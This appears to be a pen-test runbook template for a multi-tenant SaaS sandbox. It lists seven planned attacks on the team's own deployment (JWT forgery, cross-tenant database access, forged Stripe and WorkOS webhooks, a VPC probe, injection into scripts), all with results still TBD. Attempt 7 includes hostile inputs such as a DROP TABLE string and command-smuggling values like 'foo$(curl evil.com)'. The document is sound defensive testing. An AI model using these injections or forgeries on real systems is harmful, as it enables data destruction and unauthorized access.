# Runbook: Pen-Test Phase 0.5 — PENDING

**Status:** PENDING — adversarial test not yet executed.
**Owner:** Founder / Security on-call (executor) + independent reviewer
**Scope:** D-0.5.21 mandatory pre-deploy adversarial test against
SANDBOX AWS deployment with two provisioned test tenants. Seven attempt
scenarios from RESEARCH §Security Domain lines 1651–1658 covering the
STRIDE table.
**Contract:** **D-0.5.21** (LOCKED) — adversarial review by a person
AND independent reviewer sign-off MUST occur before flipping production
DNS to the SaaS infrastructure.
**Validation tests:** Automated companions in CI —
`tests/integration/tenant_isolation_test.go` (Layer 1/2/3 fail-closed
assertions cover Attempts 1+2+3 mechanically); this runbook is the
ADVERSARIAL human-driven complement.
**Closes:** `00.5-VALIDATION.md` Manual-Only Verifications row
"Cross-tenant pen-test sign-off"; referenced by
`00.5-ACCEPTANCE.md` §8 Sign-off Checklist.
**Prerequisite:** `runbooks/dr-drill-m3-attestation.md` with PASS verdict
(adversarial tests should not run against a system whose recoverability
is unproven).

> **Operator instructions.** This file is a TEMPLATE. Each `## Attempt N`
> section MUST be filled in with concrete evidence (commands run,
> outputs captured, system log excerpts) when the operator executes the
> test against the sandbox AWS environment. The `Verdict:` line for
> each attempt MUST flip from `[TBD]` to `PASS` or `FAIL`. The Executor
> + Reviewer sign-off lines at the bottom MUST be filled with real
> names + dates before this attestation is committed as the
> phase-completion gate.

---

## Pre-execution checklist

| Item | Status | Verification |
|------|--------|--------------|
| `runbooks/dr-drill-m3-attestation.md` exists with PASS verdict | [TBD] | `grep '^- RTO verdict: PASS' /Users/evgeny/neksur-core/runbooks/dr-drill-m3-attestation.md` |
| Sandbox AWS account dedicated to this drill | [TBD] | `aws sts get-caller-identity --query Account` — must NOT be production pilot account |
| Two test tenants provisioned in sandbox | [TBD] | `psql -c "SELECT count(*) FROM public.tenants WHERE workos_org_id LIKE 'org_TESTPEN%'"` returns ≥2 |
| Audit logs have accumulated normally for ≥5 min after provisioning | [TBD] | `psql -c "SELECT min(occurred_at), max(occurred_at) FROM public.system_audit_log"` |
| 3-layer isolation tests green in sandbox | [TBD] | `cd /Users/evgeny/neksur-core && DATABASE_URL=$SANDBOX_DSN go test -tags integration -run TestLayer ./tests/integration/` |
| Test tenant IDs recorded | A: [TBD] B: [TBD] | |
| Pen-test executor identity | [TBD — operator email] | WorkOS internal_admin org membership confirmed |
| Independent reviewer identity | [TBD — separate human, NOT executor] | WorkOS internal_admin org membership confirmed |
| Date of execution (UTC) | [TBD] | |

---

## Attempt 1

### Forge `tenant_id` in JWT to access another tenant's schema

**Threat ID:** T-0.5-session-hijack (Spoofing / Elevation of privilege)
**Layer attacked:** Layer 0 (WorkOS session middleware) +
defence-in-depth at Layer 1 (search_path)
**Expected mitigation:** D-0.5.21 — Plan 03 `internal/auth/workos/client.go::ValidateSession`
verifies the JWT signature against the WorkOS JWKS endpoint; a JWT
signed with a different key returns `ErrWorkOSSessionInvalid`; middleware
returns HTTP 401.

**Prerequisites:**
- Test tenant A's WorkOS organization (`org_TESTPENA`) with a valid
  user session.
- Test tenant B's tenant UUID (target).
- Attacker tool: any JWT manipulation tool (e.g., `jwt.io` decoder + a
  test signing key).

**Attack procedure:**

```bash
# 1. Capture a valid session JWT for Tenant A.
VALID_JWT=$(curl -c /tmp/cookies.txt -b /tmp/cookies.txt \
    "https://sandbox.neksur.com/auth/workos/callback?code=...&state=..." \
    2>&1 | grep workos_session)

# 2. Decode the JWT, replace `org_id` claim with tenant B's WorkOS org,
#    re-sign with a different (attacker-controlled) key.
ATTACKER_JWT=$(jwt encode --secret 'attacker-key' --alg HS256 \
    "{\"sub\":\"user_TESTA\",\"org_id\":\"org_TESTPENB\",\"exp\":9999999999}")

# 3. Send the forged JWT to a tenant-scoped endpoint.
curl -i -H "Cookie: workos_session=$ATTACKER_JWT" \
    "https://sandbox.neksur.com/v1/policies"
```

**Expected result:** HTTP 401 Unauthorized with empty/error body.
JWKS signature verification fails because the attacker-controlled key
isn't in WorkOS's published JWKS.

**Actual result:** [TBD — paste full HTTP response]

**Evidence to capture:**
- Full HTTP response (headers + body): [TBD]
- Application log line showing `ErrWorkOSSessionInvalid`: [TBD]
- WorkOS audit-log entry (if any): [TBD]

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Attempt 2

### pgwire as Tenant A's cert, SET search_path = tenant_B

**Threat ID:** T-0.5-cross-tenant-leak (Information disclosure)
**Layer attacked:** Layer 2 (Postgres role + GRANT)
**Expected mitigation:** Plan 04 — tenant_<A>_role has GRANT USAGE ON
SCHEMA only for its own schema; `SET search_path` to another tenant's
schema still requires USAGE privilege; queries fail with SQLSTATE
42501 (insufficient_privilege).

**Prerequisites:**
- Tenant A's mTLS client certificate (issued by AWS Private CA per
  Plan 04 step (l), `neksur-cli tenant cert-issue`).
- Tenant B's schema name: `tenant_<B-underscored>`.

**Attack procedure:**

```bash
psql "postgres://tenant_<A>_role@sql.neksur.com:5432/postgres?sslmode=verify-full&sslcert=tenantA.crt&sslkey=tenantA.key&sslrootcert=neksur-ca.crt" <<EOF
SET search_path = tenant_<B-underscored>;
SELECT * FROM "Table" LIMIT 1;
EOF
```

**Expected result:** SQLSTATE 42501 — `permission denied for schema
tenant_<B-underscored>` (the SET search_path command itself succeeds
but the SELECT fails because USAGE is missing).

**Actual result:** [TBD — paste exact error + SQLSTATE]

**Evidence to capture:**
- Postgres log line with SQLSTATE 42501: [TBD]
- pg_audit log entry (if pgaudit installed): [TBD]
- Confirmation no rows were returned: [TBD — paste empty result set]

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Attempt 3

### Query `public.tenants` without `app.current_tenant` GUC

**Threat ID:** T-0.5-rls-bypass-without-guc (Information disclosure)
**Layer attacked:** Layer 3 (RLS + GUC)
**Expected mitigation:** Plan 02 V0042 — RLS predicate
`current_setting('app.current_tenant', true) = id::text` evaluates to
FALSE when the GUC is unset; rows are hidden regardless of role
(only BYPASSRLS roles can see all rows).

**Prerequisites:**
- A connection that has NO `app.current_tenant` GUC set.
- Any tenant role (NOT admin_role / BYPASSRLS).

**Attack procedure:**

```bash
psql "postgres://tenant_<A>_role@sql.neksur.com:5432/postgres?sslmode=verify-full&sslcert=tenantA.crt&sslkey=tenantA.key&sslrootcert=neksur-ca.crt" <<EOF
-- Deliberately do NOT issue: SET LOCAL app.current_tenant = '<A-uuid>';
SELECT count(*) FROM public.tenants;
SELECT count(*) FROM public.tenant_billing;
EOF
```

**Expected result:** Both SELECTs return `count = 0` (RLS hides ALL
rows when GUC is unset; no SQLSTATE error). NOT an error — silent
zero-row return.

**Actual result:** [TBD — paste count(*) results]

**Evidence to capture:**
- Confirmation `count = 0` for both tables: [TBD]
- Confirmation NO `42501` error fired (RLS is silent, not noisy): [TBD]
- Counter-test (PASS): with `SET LOCAL app.current_tenant = '<A-uuid>'`
  prepended, the same query returns 1 row for tenant A's own row: [TBD]

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Attempt 4

### Stripe webhook with `BILLING_ENABLED=false` + forged signature

**Threat ID:** T-0.5-stripe-spoof (Spoofing)
**Layer attacked:** Plan 05 `internal/billing/webhook.go`
**Expected mitigation:** signature-verify-before-flag-check pattern —
the handler verifies the `Stripe-Signature` header BEFORE checking
`BILLING_ENABLED`; forged signature returns HTTP 400 with empty body
EVEN WHEN BILLING_ENABLED=false (defence in depth — D-0.5.21).

**Prerequisites:**
- Sandbox Neksur deployment with `BILLING_ENABLED=false` (the Phase
  0.5 default).
- A forged Stripe webhook event JSON.

**Attack procedure:**

```bash
# 1. Build a forged webhook event.
EVENT_JSON='{"type":"customer.subscription.deleted","data":{"object":{"customer":"cus_ATTACKER"}}}'

# 2. Forge the signature header (any non-matching signature).
FORGED_SIG="t=$(date +%s),v1=deadbeefcafebabe1234567890abcdef"

# 3. POST to the webhook endpoint.
curl -i -X POST \
    -H "Stripe-Signature: $FORGED_SIG" \
    -H "Content-Type: application/json" \
    -d "$EVENT_JSON" \
    https://sandbox.neksur.com/webhooks/stripe
```

**Expected result:** HTTP 400 with empty body. Application log shows
`stripe webhook signature verification failed`. NO state change occurs
in `public.tenant_billing`.

**Actual result:** [TBD]

**Evidence to capture:**
- HTTP response status + body: [TBD]
- Application log line with `signature verification failed`: [TBD]
- Confirmation `public.tenant_billing` row count unchanged before/after: [TBD]

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Attempt 5

### WorkOS webhook with forged signature

**Threat ID:** T-0.5-workos-webhook-spoof (Spoofing)
**Layer attacked:** Plan 03 `internal/auth/workos/webhook.go`
**Expected mitigation:** verify-before-flag-check pattern, identical to
Attempt 4 — forged signature returns HTTP 400.

**Prerequisites:**
- A forged WorkOS Organization event JSON (e.g., a fake
  "organization.deleted" event for a tenant).

**Attack procedure:**

```bash
EVENT_JSON='{"event":"organization.deleted","data":{"id":"org_TESTPENA"}}'
FORGED_SIG="t=$(date +%s),v1=deadbeefcafebabe1234567890abcdef"
curl -i -X POST \
    -H "WorkOS-Signature: $FORGED_SIG" \
    -H "Content-Type: application/json" \
    -d "$EVENT_JSON" \
    https://sandbox.neksur.com/webhooks/workos
```

**Expected result:** HTTP 400, empty body, log line indicates
signature verification failed. NO state change in `public.tenants`.

**Actual result:** [TBD]

**Evidence to capture:**
- HTTP response + body: [TBD]
- Log line: [TBD]
- Confirmation `public.tenants.lifecycle_state` for `org_TESTPENA`
  unchanged: [TBD]

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Attempt 6

### Cross-customer VPC connection to another customer's Pool B

**Threat ID:** T-0.5-vpc-peer-misconfig (Spoofing / Information disclosure)
**Layer attacked:** AWS network layer (VPC peering + SG rules)
**Expected mitigation:** Plan 05 `modules/customer-peering` adds an SG
ingress rule scoped to the requesting customer's CIDR ONLY; other
customers' VPCs have no route AND no SG ingress to this customer's
Pool B.

**Prerequisites:**
- Two sandbox "customer" VPCs peered to Neksur (Sandbox Tenant A and
  Sandbox Tenant B).
- One sandbox Pool B (or a separate sandbox Pool A as proxy if Pool B
  isn't provisioned — note in evidence).

**Attack procedure:**

```bash
# From a VM in Sandbox Tenant A's customer VPC, attempt connection to
# Sandbox Tenant B's Pool B endpoint.
nc -zv pool-b-sandbox-tenantB.neksur.com 5432
# OR if no Pool B exists, use the Neksur-side Pool A IP from Tenant B's perspective:
nc -zv 10.0.X.X 5432  # X.X = Tenant B's allocated subnet
```

**Expected result:** Connection times out (no route AND/OR SG ingress
blocks). NOT a "connection refused" — that would mean route exists
but firewall denied, which is fine; we want the timeout that proves
no route exists.

**Actual result:** [TBD — paste full nc output + timing]

**Evidence to capture:**
- `nc -zv` output (timeout indicator): [TBD]
- VPC flow log excerpt showing the dropped packet (Tenant A VPC):
  `aws ec2 describe-flow-logs ... | jq ...`: [TBD]
- Counter-test: from Tenant B's own VPC, the same `nc` succeeds in
  <1s (proves SG works for the legitimate peer): [TBD]

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Attempt 7

### SQL/shell injection through `<tenant-uuid>` parameter

**Threat ID:** T-0.5-prov-injection (Tampering)
**Layer attacked:** Plan 03/04 input validators (Go ValidateUUIDv4 +
bash regex validators in scripts/*)
**Expected mitigation:** Plan 03 `internal/tenant/id.go::ValidateUUIDv4`
+ Plan 04 bash regex validators reject any non-canonical-lowercase-UUID-v4
input with exit code 2 BEFORE any psql or terraform interpolation.

**Prerequisites:**
- Sandbox Neksur deployment with `./scripts/provision-tenant.sh`
  accessible to the executor.

**Attack procedure:**

```bash
# Six injection-style inputs to assert all are rejected pre-CLI:

# (a) SQL injection attempt in tenant-uuid:
./scripts/provision-tenant.sh "foo'; DROP TABLE tenants;--" 'org_INJECT' 'vpc-injection00000000000' 'us-east-1'

# (b) Shell metachar injection:
./scripts/provision-tenant.sh 'foo$(rm -rf /tmp/test)' 'org_INJECT' 'vpc-injection00000000000' 'us-east-1'

# (c) Path traversal:
./scripts/provision-tenant.sh '../../../etc/passwd' 'org_INJECT' 'vpc-injection00000000000' 'us-east-1'

# (d) Uppercase UUID (regex rejects):
./scripts/provision-tenant.sh 'AAAAAAAA-AAAA-4AAA-AAAA-AAAAAAAAAAAA' 'org_INJECT' 'vpc-injection00000000000' 'us-east-1'

# (e) Non-UUID-v4 (wrong version nibble):
./scripts/provision-tenant.sh '12345678-1234-3234-1234-123456789012' 'org_INJECT' 'vpc-injection00000000000' 'us-east-1'

# (f) Same injections against lifecycle scripts:
./scripts/tenant-suspend.sh "'; DROP TABLE tenants;--"
./scripts/tenant-delete.sh 'foo$(curl evil.com)' --yes
```

**Expected result:** ALL inputs exit with code 2 ("invalid UUID v4" or
"invalid workos org id" etc.) BEFORE any psql/terraform/neksur-cli call.
NO state change on the sandbox.

**Actual result (one row per input):**

| Input | Expected exit code | Actual exit code | Error message |
|-------|--------------------|--------------------|---------------|
| (a) SQL injection | 2 | [TBD] | [TBD] |
| (b) Shell metachar | 2 | [TBD] | [TBD] |
| (c) Path traversal | 2 | [TBD] | [TBD] |
| (d) Uppercase UUID | 2 | [TBD] | [TBD] |
| (e) Wrong version nibble | 2 | [TBD] | [TBD] |
| (f) Lifecycle scripts | 2 | [TBD] | [TBD] |

**Evidence to capture:**
- Per-input stderr output: [TBD]
- Confirmation `public.tenants` row count unchanged before/after: [TBD]
- Confirmation no terraform state change: [TBD]
- The 6 inputs above represent SQL injection, shell injection, path
  traversal, case-mismatch, version-mismatch, and lifecycle-script
  coverage.

- Verdict: [TBD] (PASS|FAIL|PARTIAL)

---

## Post-test teardown

After all 7 attempts:

1. **Tear down the two sandbox test tenants** — exercises the
   `./scripts/tenant-delete.sh --yes` path as a bonus end-to-end test:
   ```bash
   ./scripts/tenant-delete.sh <tenant-A-uuid> --yes
   ./scripts/tenant-delete.sh <tenant-B-uuid> --yes
   ```
2. **Confirm sandbox AWS account incurred no stranded costs:**
   ```bash
   aws ec2 describe-vpc-peering-connections --region us-east-1 \
     --filters 'Name=tag:ManagedBy,Values=neksur-customer-peering' \
     --query 'VpcPeeringConnections[?Status.Code==`active`]' | jq '. | length'
   # Expect: 0 (all destroyed by tenant-delete.sh terraform destroy step)
   ```
3. **Capture the final state of sandbox `public.tenants`:**
   ```bash
   psql "$SANDBOX_DSN" -c "SELECT id, lifecycle_state FROM public.tenants WHERE workos_org_id LIKE 'org_TESTPEN%'"
   # Expect: both rows show lifecycle_state='deleted'.
   ```

---

## Verdict summary

| Attempt | Threat ID | Verdict |
|---------|-----------|---------|
| 1 | T-0.5-session-hijack | [TBD] |
| 2 | T-0.5-cross-tenant-leak (Layer 2) | [TBD] |
| 3 | T-0.5-rls-bypass-without-guc (Layer 3) | [TBD] |
| 4 | T-0.5-stripe-spoof | [TBD] |
| 5 | T-0.5-workos-webhook-spoof | [TBD] |
| 6 | T-0.5-vpc-peer-misconfig | [TBD] |
| 7 | T-0.5-prov-injection | [TBD] |

**Overall verdict:** [TBD — PASS (all 7 PASS) / PARTIAL (file follow-up ticket per FAIL) / FAIL (block production cutover)]

**Follow-up tickets filed (if any):** [TBD]

---

## Sign-off

The pen-test attestation is closed only when BOTH executor and reviewer
have signed. D-0.5.21 mandates dual sign-off — independent reviewer
re-runs at least one PASS attempt and independently re-verifies the
verdict.

## Executor:

[TBD — executor email]  Date: [TBD]

## Reviewer:

[TBD — independent reviewer email (NOT executor)]  Date: [TBD]

---

## Cross-references

- `tests/integration/tenant_isolation_test.go` — automated companions
  for Attempts 1+2+3 (Layer1/2/3 fail-closed tests). The pen-test is
  the ADVERSARIAL human-driven complement.
- `tests/integration/stripe_webhook_test.go` — automated companion for
  Attempt 4.
- `tests/integration/workos_session_test.go` — automated companion for
  Attempts 1+5.
- `tests/integration/pgwire_reach_test.go` — sandbox-attestation
  surface for the network topology that Attempt 6 stresses.
- `runbooks/dr-drill-m3-attestation.md` — UPSTREAM prerequisite.
- `runbooks/vpc-peering-sandbox-attestation.md` — Plan 07 Task 4
  parallel attestation (REQ-saas-cloud-topology proof).
- `runbooks/tenant-lifecycle.md` — used by post-test teardown.
- `.planning/phases/00.5-saas-pilot-infrastructure/00.5-CONTEXT.md`
  D-0.5.21 — mandatory pre-deploy gate.
- `.planning/phases/00.5-saas-pilot-infrastructure/00.5-RESEARCH.md`
  §Security Domain lines 1607–1660 — STRIDE table + 7 attempt scenarios.
- `.planning/phases/00.5-saas-pilot-infrastructure/00.5-ACCEPTANCE.md`
  §8 — Sign-off Checklist row for this attestation.
